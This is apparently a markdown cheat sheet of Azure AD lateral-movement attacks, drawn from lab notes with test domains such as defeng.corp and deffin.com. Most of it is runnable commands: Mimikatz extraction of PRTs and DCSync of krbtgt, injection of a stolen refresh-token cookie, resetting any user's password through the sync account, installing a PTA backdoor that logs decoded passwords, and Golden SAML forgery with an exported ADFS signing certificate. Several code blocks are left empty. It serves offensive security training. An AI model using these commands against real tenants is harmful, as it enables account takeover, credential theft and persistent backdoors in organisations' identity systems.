# Lateral movement

* [Pass the certificate](#Pass-the-certificate)
  * [Pass the PRT](#Pass-the-PRT) 
* [Intune](#Intune)
* [Abusing dynamic groups](#Abusing-dynamic-groups)
* [Application proxy abuse](#Application-proxy-abuse)
* [Hybrid Identity](#Hybrid Identity)
  * [Password Hash Sync (PHS) Abuse](#Password-Hash-Sync-(PHS)-Abuse)
  * [Pass Through Authentication (PTA) Abuse](#Pass-Through-Authentication-(PTA)-Abuse)
  * [Federation (ADFS)](#Federation-(ADFS))

## Pass the certificate
- To go from Azure AD machine to other Azure AD machine if the user has administrative access to other machines.

#### Check if machine is Azure AD Joined
```
dsregcmd /status
```

#### Extract PRT, Session key and Tenant ID
```
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" ""exit"'
```

#### Extract context key and derived key
```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:<keyvalue> /unprotect" "exit"'
```

#### Request a certificate from PRT
- https://github.com/morRubin/PrtToCert
```

```

#### Use certificate to add a user with administrative privileges
- Code is modified in the lab
- https://github.com/morRubin/AzureADJoinedMachinePTC
```

```

### Pass the PRT
#### Request access token (cookie) to all applications
```
Import-Module .\AADInternals.psd1
New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SessionKey -GetNonce
```

#### Copy the value from above command and use it with a web browser
– Open the Browser in Incognito mode
– Go to https://login.microsoftonline.com/login.srf
– Press F12 (Chrome dev tools) -> Application -> Cookies
– Clear all cookies and then add one named `x-ms-RefreshTokenCredential` for https://login.microsoftonline.com and set its value to that retrieved from AADInternals
– Mark HTTPOnly and Secure for the cookie
– Visit https://login.microsoftonline.com/login.srf again and we will get access as the user!


## Intune
- a user with Global Administrator or Intune Administrator role can execute PowerShell scripts on an enrolled Windows device. The script runs with privileges of SYSTEM on the device.
```

```

## Abusing dynamic groups
- By default, any user can invite guests in Azure AD. If a dynamic group rule allows adding users based on the attributes that a guest user can modify, it will result in abuse of this feature. For example based on EMAIL ID and join as guest that matches that rule.

## Application proxy abuse
- The application behind the proxy may have vulnerabilities to access the on-prem environment.
#### Enumerate application which has a application proxy configured
```
Import-Module .\AzureAD.psd1
Get-AzureADApplication | %{try{Get-AzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}
```

#### Get the Service Principal
```
Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "Finance Management System"} 
```

#### Find user and groups assigned to the application
```
. .\Get-ApplicationProxyAssignedUsersAndGroups.ps1
Get-ApplicationProxyAssignedUsersAndGroups -ObjectId <OBJECT ID OF SERVICE PRINCIPAL>
```

## Hybrid Identity
## Password Hash Sync (PHS) Abuse
- Check if there is an account name with MSOL_<INSTALLATION ID>. This user has DCSYNC rights.
- Passwords for both the accounts are stored in SQL server on the server where Azure AD Connect is installed and it is possible to extract them in clear-text if you have admin privileges on the server.

#### Enumerate server where Azure AD is installed (on prem command)
```
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName,Description | fl
```

#### Enumerate server where Azure AD is installed (Azure command)
```
Import-Module .\AzureAD.psd1
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```

#### Extract credentials from the server
```
Get-AADIntSyncCredentials
```

#### Run DCSync with creds of MSOL_* account
```
runas /netonly /user:defeng.corp\MSOL_782bef6aa0a9 cmd 
Invoke-Mimikatz -Command '"lsadump::dcsync/user:defeng\krbtgt /domain:defeng.corp /dc:defeng-dc.defeng.corp"'
```

### Reset password of any user
- Using the Sync_* account we can reset password for any user. (Including Global Administrator and the user who created the tenant)

#### Using the creds, request an access token for AADGraph and save it to cache
```
$passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_DEFENG-ADCNCT_782bef6aa0a9@defcorpsecure.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
```

#### Enumerate global admin
```
Get-AADIntGlobalAdmins
```

#### Get the ImmutableID
```
Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId
```

#### Reset the Azure password
```
Set-AADIntUserPassword -SourceAnchor "E2gG19HA4EaDe0+3LkcS5g==" -Password "SuperSecretpass#12321" -Verbose
```

#### Reset password for cloud only user
- Need CloudAnchor ID which is the format <USER>_<OBJECTID>
```
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID
Set-AADIntUserPassword -CloudAnchor "User_10caa362-7d18-48c9-a45b-9c3a78f3a96b" -Password "SuperSecretpass#12321" -Verbose
```

## Pass Through Authentication (PTA) Abuse
- Once we have admin access to an Azure AD connect server running PTA agent.
- Once the backdoor is installed, we can authenticate as any user synced from onprem without knowing the correct password!

#### Install a backdoor (needs to be run ad administrator
```
Install-AADIntPTASpy
```

### See passwords of on-prem users authenticating
- Stored in C:\PTASpy
```
Get-AADIntPTASpyLog -DecodePasswords
```

#### Register a new PTA agent
- After getting Global Administrator privileges by setting it on a attacker controled machine.
```
Install-AADIntPTASpy
```

## Federation (ADFS)
- Golden SAML Attack
#### Get the ImmutableID
```
[System.Convert]::ToBase64String((Get-ADUser -Identity onpremuser | select -ExpandProperty ObjectGUID).tobytearray())
```

#### On ADFS server (As administrator)
```
Get-AdfsProperties |select identifier
```

#### Check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
```
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri
```

#### Extract the ADFS token signing certificate
- With DA privileges on-prem
```
Import-Module .\AADInternals.psd1
Export-AADIntADFSSigningCertificate
```

#### Access cloud apps as any user
```
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```

### With DA privileges on-prem, it is possible to create ImmutableID of cloud only users!
#### Create a realistic ImmutableID
```
[System.Convert]::ToBase64String((New-Guid).tobytearray())
```

#### Export the token signing certificate
```
Import-Module .\AADInternals.psd1
Export-AADIntADFSSigningCertificate
```

#### Use the below command from AADInternals to access cloud apps as the user whose immutableID is specified 
```
Open-AADIntOffice365Portal -ImmutableID pwrtlmsicU+5tgCUgHx2tA== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
